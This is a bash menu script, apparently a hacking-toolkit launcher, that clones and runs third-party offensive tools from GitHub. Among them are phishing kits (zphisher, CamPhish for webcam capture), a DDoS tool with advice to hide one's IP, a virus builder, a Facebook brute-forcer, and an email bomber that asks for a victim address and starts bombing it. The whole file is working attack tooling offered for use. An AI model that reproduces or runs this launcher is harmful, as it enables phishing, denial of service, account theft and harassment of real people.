clear
mkdir -p Tools
clear 
echo -e '\033[32;40;1m 
 ----------------------------------
       ----edinborgTM----
----------------------------------v4
       EdinborgTM
  Coded by edinborgTM
  github: https://github.com/edinborgTM
\033[33;1mVersion:\033[0m 4            \033[33;1mCTRL+C:\033[0m exit          \033[33;1mAuthor:\033[0m edinborgTM

\033[37;1m[1]\033[32;1m AUTO-IP-CHANGER              \033[37;1m[2]\033[32;1m RED_HAWK
\033[37;1m[3]\033[32;1m Phishing Tool                \033[37;1m[4]\033[32;1m HackerPro
\033[37;1m[5]\033[32;1m Ip Info                      \033[37;1m[6]\033[32;1m WebCam Hack
\033[37;1m[7]\033[32;1m DDOS Attack                  \033[37;1m[8]\033[32;1m VirusCrafter
\033[37;1m[9]\033[32;1m BadMod                       \033[37;1m[10]\033[32;1m Info-Site
\033[37;1m[11]\033[32;1m Gmail Bomber                 \033[37;1m[12]\033[32;1m dorks-eye
\033[37;1m[13]\033[32;1m Subscan                      \033[37;1m[14]\033[32;1m DARKARMY
\033[37;1m[15]\033[32;1m Facebash                     \033[37;1m[16]\033[32;1m Requirements & Update
\033[37;1m[17]\033[32;1m Uninstall Tools              \033[37;1m[18]\033[32;1m How to Use?
\033[0m'

# Select Option
read -p $'\033[32;1mEnter option number: \033[0m' islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear
echo -e "\033[32;40;1m Installing AUTO-IP-CHANGER...\033[0m"
sleep 3
cd Tools
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[32;40;1m Go to your browser and set the proxy (socks proxy) to 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
aut

elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[32;40;1m Installing RED_HAWK...\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[32;40;1m Installing Phishing Tool...\033[0m"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "\033[32;40;1m Installing HackerPro...\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[32;40;1m Installing Ip Info...\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[32;40;1m Installing WebCam Hack...\033[0m"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islem == 7 || $islem == 07 ]]; then
clear
echo -e "\033[32;40;1m Installing DDOS Attack...\033[0m"
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo ""
echo -e "\033[32;40;1m Hide your IP before using this tool\033[0m"

elif [[ $islem == 8 || $islem == 08 ]]; then
clear
echo -e "\033[32;40;1m Installing VirusCrafter...\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $islem == 9 || $islem == 09 ]]; then
clear
echo -e "\033[32;40;1m Installing BadMod...\033[0m"
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $islem == 10 || $islem == 010 ]]; then
clear
echo -e "\033[32;40;1m Installing Info-Site...\033[0m"
sleep 3
cd Tools
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $islem == 11 || $islem == 011 ]]; then
clear
echo -e "\033[32;40;1m Installing Gmail Bomber...\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[32;40;1m This installation may take some time\033[0m"
echo -e "\033[32;40;1m Press Ctrl+C to stop\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "-------------------------"
read -p $'\033[32;1mEnter an email address to bomb: \033[0m' mail
echo "-------------------------"
php index.php start-bombing $mail

elif [[ $islem == 12 || $islem == 012 ]]; then
clear
echo -e "\033[32;40;1m Installing dorks-eye...\033[0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $islem == 13 || $islem == 013 ]]; then
clear
echo -e "\033[32;40;1m Installing Subscan...\033[0m"
sleep 3
cd Tools
git clone https://github.com/zidansec/subscan
cd subscan
read -p $'\033[32;1mEnter a domain (e.g., example.com): \033[0m' sc
./subscan $sc

elif [[ $islem == 14 || $islem == 014 ]]; then
clear
echo -e "\033[32;40;1m Installing DARKARMY...\033[0m"
sleep 3
cd Tools
pkg install git
pkg install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
cd DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $islem == 15 || $islem == 015 ]]; then
clear
echo -e "\033[32;40;1m Installing Facebash...\033[0m"
sleep 3
cd Tools
git clone https://github.com/fu8uk1/facebash
cd facebash
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $islem == 16 || $islem == 016 ]]; then
clear
echo -e "\033[32;40;1m Installing Requirements & Update...\033[0m"
sleep 5
pkg install git -y
pkg install python python3 -y
pkg install pip pip3 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[32;40;1m Update completed...\033[0m"
sleep 3
bash alhack.sh

elif [[ $islem == 17 || $islem == 017 ]]; then
clear
echo -e "\033[32;40;1m Uninstalling downloaded tools...\033[0m"
sleep 3 
rm -rf Tools
bash alhack.sh

else   
    clear
    echo -e '\033[31;40;1m Invalid option entered\033[0m'
    sleep 1
    clear 
    bash alhack.sh
fi
